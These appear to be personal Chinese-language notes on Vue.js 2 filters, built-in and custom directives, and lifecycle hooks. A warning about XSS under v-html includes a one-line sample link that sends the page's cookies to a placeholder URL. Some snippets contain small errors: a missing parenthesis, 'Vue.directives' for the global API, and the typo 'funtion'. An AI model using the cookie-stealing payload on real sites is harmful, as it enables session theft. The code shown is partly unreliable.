# 过滤器
- 本质是函数
- 支持管道运算符 `{{ val | filterA | filterB(args) }}`
```html
<div id="root">
  <h2>显示格式化后的时间</h2>
  <!-- 计算属性实现 -->
  <h3>现在是：{{fmtTime}}</h3>
  <!-- methods实现 -->
  <h3>现在是：{{getFmtTime()}}</h3>
  <!-- 过滤器实现 -->
  <h3>现在是：{{time | timeFormater}}</h3>
  <!-- 过滤器实现（传参） -->
  <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
  <h3 :x="msg | mySlice">poi</h3>
</div>

<div id="root2">
  <h2>{{msg | mySlice}}</h2>
</div>
```
```js
//全局过滤器
Vue.filter('mySlice',function(value){
  return value.slice(0,4)
})

new Vue({
  el:'#root',
  data:{
    time:1621561377603
  },
  computed: {
    fmtTime(){ return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss' }
  },
  methods: {
    getFmtTime(){ return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss') }
  },
  //局部过滤器
  filters:{
    timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
      return dayjs(value).format(str)
    }
  }
})

new Vue({
  el:'#root2',
  data:{
    msg:'hello!'
  }
})
```

# 其他指令
## v-text
- 替换整体元素的文本内容 `<el v-text="prop"></el>`
## v-html
- 相比 `v-text`，如果内容为 html 代码，可以在浏览器上解析
  - 因而，使用时要注意安全问题(XSS攻击)
  - `<a href=javascript:location.href="url?"+document.cookie>递出当前页面的cookie</a>`(可以配置 HttpOnly 使这个无效)

## v-cloak
- 初始配置`v-cloak`使el隐藏。Vue实例接管el后，移除该标签。
- 用途: 避免因脚本加载过慢导致在界面展示出未渲染的原始代码。
```html
	<head>
		<style> [v-cloak]{ display:none;} </style>
	</head>
  <body> 
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
  </body>
```

## v-once
- 只渲染数据一次，不保持数据响应
- 比如，记录一个初始值
- 如果已知数据不会改变，可以配置这个优化性能
```html
<div id="root">
  <h2 v-once>初始化的n值是:{{n}}</h2>
  <h2>当前的n值是:{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>
```

## v-pre
- 指明这个元素不需要动态渲染
- 不含动态内容的，配置这个可以优化性能

# 自定义指令
```js
new Vue({
  ...
  // 调用时机: 
  //   1.指令与元素成功绑定时
  //   2.vue实例绑定的模板重新渲染时(虽然不够精确，但是也确实没法精确实现)
  // 指令函数里面的 this 都是 window
  // 这里是局部指令
  directives:{

    // v-dt1
    dt1(element,binding){
      element.innerText = binding.value
    },
    dt2: {
      bind(el,bind){},
      inserted(el,bind){},
      update(el,bind){}
    },
    "dt-3": function(){}
  }
})
// 全局指令
Vue.directives('dt-4',{...})
Vue.directives('dt-5',funtion(){})
```

# 生命周期
![picture 2](https://p1.kodo-oss.dronekumo.xyz/95ec50905cdbaca9b7e5ae2de3ba82bc770d78fe8e486ee72cb9a59a71448dea.png)  
## 常用的2个钩子
### mounted
### beforeDestroy